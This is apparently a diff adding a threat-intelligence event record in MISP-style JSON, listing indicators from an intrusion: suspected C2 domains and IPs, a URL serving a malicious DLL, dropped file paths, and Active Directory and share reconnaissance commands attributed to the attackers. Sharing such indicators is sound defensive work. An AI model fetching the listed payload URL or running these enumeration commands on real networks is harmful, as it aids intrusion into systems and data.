+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "buyblocknow.com",
+        "type": "domain",
+        "category": "Network activity",
+        "uuid": "f817e597-d844-4797-9793-8d9ba3fb292b",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "trailcosolutions.com",
+        "type": "domain",
+        "category": "Network activity",
+        "uuid": "0513cac5-6669-4948-bd7b-0b4fc1d253ab",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "temp.sh",
+        "type": "domain",
+        "category": "Network activity",
+        "uuid": "5ecd2c94-d2f3-41d5-975e-9c02f517551d",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "198.27.121.195",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "2fe245a4-754e-4004-8215-5c65cd80a21f",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "151.80.52.32",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "c069826a-5ae2-4b76-9b48-c56128a2826f",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "DLL Download via Powershell",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "http://91.134.207.30:801/download/ibm_inet.dll",
+        "type": "url",
+        "category": "Network activity",
+        "uuid": "e84e3b6c-f30e-4811-b199-a168f0d2e22d",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "DLL Download via Powershell",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "%PUBLIC%\\ibm_inet.dll",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "325cca37-5597-4d9a-bc31-157343c19f61",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Outputfile of sh.exe execution",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "1.txt",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "22a485e2-026e-4d6e-9ba1-e1d95e98bb50",
+        "Tag": [
+          {
+            "colour": "#0064ac",
+            "name": "osint:source-type=\"manual-collection\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "7z used by attackers",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "%PUBLIC%\\16DNS\\7zG.exe",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "8aecea5b-2de2-47f2-9782-f4384caee2a7",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Command executed by attackers",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "net user /DOMAIN",
+        "type": "text",
+        "category": "Other",
+        "uuid": "b66cce03-2307-4d52-83eb-64f039791318",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Command executed by attackers",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "whoami /all",
+        "type": "text",
+        "category": "Other",
+        "uuid": "c674e013-9558-42a1-a0d5-fbb3eec56f01",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Sharp Share Powershell script",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "%USERPROFILE%\\Documents\\Invoke-Sharpshares.ps1",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "e0ffad87-e014-4b45-8867-973e9fbe809d",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Sharp Share Powershell script",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "Invoke-Sharpshares.ps1",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "1ef2ea52-5928-4719-82ee-8d5139bacd55",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Command executed by attackers",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "sh.exe /ldap:all /threads:50 /outfile:1.txt",
+        "type": "text",
+        "category": "Other",
+        "uuid": "ae8fd1dd-1534-4390-b8f0-3e7acec72eb6",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Command executed by attackers",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "sh.exe shares",
+        "type": "text",
+        "category": "Other",
+        "uuid": "66bee028-f009-40fa-97e6-707c993e8029",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Executed by attacker",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "\\\\tsclient\\C\\16_DNS.ps1",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "8fbcb1e6-1ff7-4023-bb81-e96bdeb65004",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      }
+    ]
+  }
+}
